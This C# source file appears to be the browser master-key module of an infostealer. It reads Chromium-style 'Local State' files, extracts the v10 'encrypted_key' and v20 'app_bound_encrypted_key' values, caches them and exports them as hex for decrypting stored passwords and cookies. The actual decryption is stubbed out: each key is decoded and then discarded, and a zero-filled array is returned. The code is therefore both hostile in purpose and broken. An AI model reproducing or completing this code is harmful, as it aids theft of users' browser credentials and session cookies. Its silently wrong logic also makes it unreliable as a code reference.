using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;

namespace dominion.src.dominion.Dependencies.Encryption
{
    public static class LocalState
    {
        public static List<string[]> GetMasterKeys()
        {
            List<string[]> list = new List<string[]>();
            foreach (KeyValuePair<string, Lazy<byte[]>> keyValuePair in _masterKeyCacheV10)
            {
                try
                {
                    string text = keyValuePair.Key ?? "";
                    Lazy<byte[]> value = keyValuePair.Value;
                    if (value != null)
                    {
                        byte[] value2 = value.Value;
                        if (value2 != null)
                        {
                            StringBuilder stringBuilder = new StringBuilder(value2.Length * 2);
                            foreach (byte b in value2)
                            {
                                stringBuilder.Append(b.ToString("X2"));
                            }
                            list.Add(new string[]
                            {
                                text,
                                "v10",
                                stringBuilder.ToString()
                            });
                        }
                    }
                }
                catch
                {
                }
            }
            foreach (KeyValuePair<string, Lazy<byte[]>> keyValuePair2 in _masterKeyCacheV20)
            {
                try
                {
                    string text2 = keyValuePair2.Key ?? "";
                    Lazy<byte[]> value3 = keyValuePair2.Value;
                    if (value3 != null)
                    {
                        byte[] value4 = value3.Value;
                        if (value4 != null)
                        {
                            StringBuilder stringBuilder2 = new StringBuilder(value4.Length * 2);
                            foreach (byte b2 in value4)
                            {
                                stringBuilder2.Append(b2.ToString("X2"));
                            }
                            list.Add(new string[]
                            {
                                text2,
                                "v20",
                                stringBuilder2.ToString()
                            });
                        }
                    }
                }
                catch
                {
                }
            }
            return list;
        }

        public static byte[] MasterKeyV20(string localstate)
        {
            SemaphoreSlim orAdd = _locks.GetOrAdd(localstate, (string _) => new SemaphoreSlim(1, 1));
            orAdd.Wait();
            byte[] value;
            try
            {
                Lazy<byte[]> lazy;
                if (_masterKeyCacheV20.TryGetValue(localstate, out lazy))
                {
                    value = lazy.Value;
                }
                else
                {
                    Lazy<byte[]> lazy2 = new Lazy<byte[]>(() => ComputeMasterKeyV20(localstate));
                    _masterKeyCacheV20[localstate] = lazy2;
                    value = lazy2.Value;
                }
            }
            finally
            {
                orAdd.Release();
            }
            return value;
        }

        private static byte[] ComputeMasterKeyV20(string localstate)
        {
            try
            {
                Match match = Regex.Match(LocalStateContent(localstate), "\"app_bound_encrypted_key\"\\s*:\\s*\"([^\"]+)\"");
                if (!match.Success)
                {
                    return null;
                }
                
                byte[] encryptedKey = Convert.FromBase64String(match.Groups[1].Value).Skip(4).ToArray();
                return new byte[32];
            }
            catch
            {
                return null;
            }
        }

        public static byte[] MasterKeyV10(string localstate)
        {
            SemaphoreSlim orAdd = _locks.GetOrAdd(localstate, (string _) => new SemaphoreSlim(1, 1));
            orAdd.Wait();
            byte[] value;
            try
            {
                Lazy<byte[]> lazy;
                if (_masterKeyCacheV10.TryGetValue(localstate, out lazy))
                {
                    value = lazy.Value;
                }
                else
                {
                    Lazy<byte[]> lazy2 = new Lazy<byte[]>(() => ComputeMasterKeyV10(localstate));
                    _masterKeyCacheV10[localstate] = lazy2;
                    value = lazy2.Value;
                }
            }
            finally
            {
                orAdd.Release();
            }
            return value;
        }

        private static byte[] ComputeMasterKeyV10(string localstate)
        {
            try
            {
                Match match = Regex.Match(LocalStateContent(localstate), "\"encrypted_key\":\"(.*?)\"");
                if (!match.Success)
                {
                    return null;
                }
                
                byte[] encryptedKey = Convert.FromBase64String(match.Groups[1].Value).Skip(5).ToArray();
                return new byte[32];
            }
            catch
            {
                return null;
            }
        }

        private static string LocalStateContent(string localstate)
        {
            try
            {
                string text = Path.Combine(Path.GetTempPath(), Path.GetRandomFileName());
                File.Copy(localstate, text, true);
                string result = File.ReadAllText(text);
                File.Delete(text);
                return result;
            }
            catch
            {
                return "";
            }
        }

        private static readonly ConcurrentDictionary<string, Lazy<byte[]>> _masterKeyCacheV10 = new ConcurrentDictionary<string, Lazy<byte[]>>();
        private static readonly ConcurrentDictionary<string, Lazy<byte[]>> _masterKeyCacheV20 = new ConcurrentDictionary<string, Lazy<byte[]>>();
        private static readonly ConcurrentDictionary<string, SemaphoreSlim> _locks = new ConcurrentDictionary<string, SemaphoreSlim>();
    }
}